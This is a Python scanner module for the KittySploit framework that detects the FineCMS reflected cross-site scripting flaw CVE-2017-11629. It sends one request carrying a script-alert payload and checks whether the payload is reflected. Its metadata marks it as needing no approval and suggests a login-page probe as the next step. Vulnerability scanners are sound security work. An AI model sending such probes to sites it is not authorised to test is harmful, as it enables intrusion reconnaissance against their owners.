#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""FineCMS through 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'FineCMS <=5.0.10 - Cross-Site Scripting Detection',
        'description': 'FineCMS through 5.0.10 contains a cross-site scripting vulnerability in controllers/api.php via the function parameter in a c=api&m=data2 request.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'xss', 'finecms', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://lorexxar.cn/2017/07/20/FineCMS%20multi%20vulnerablity%20before%20v5.0.9/#URL-Redirector-Abuse',
            'http://lorexxar.cn/2017/07/20/FineCMS%20multi%20vulnerablity%20before%20v5.0.9/#api-php-Reflected-XSS',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-11629/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-11629',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?c=api&m=data2&function=%3Cscript%3Ealert(document.domain)%3C/script%3Ep&format=php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>p不存在',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="FineCMS <=5.0.10 - Cross-Site Scripting detected",
                path='/index.php?c=api&m=data2&function=%3Cscript%3Ealert(document.domain)%3C/script%3Ep&format=php',
            )
            return True
        return False

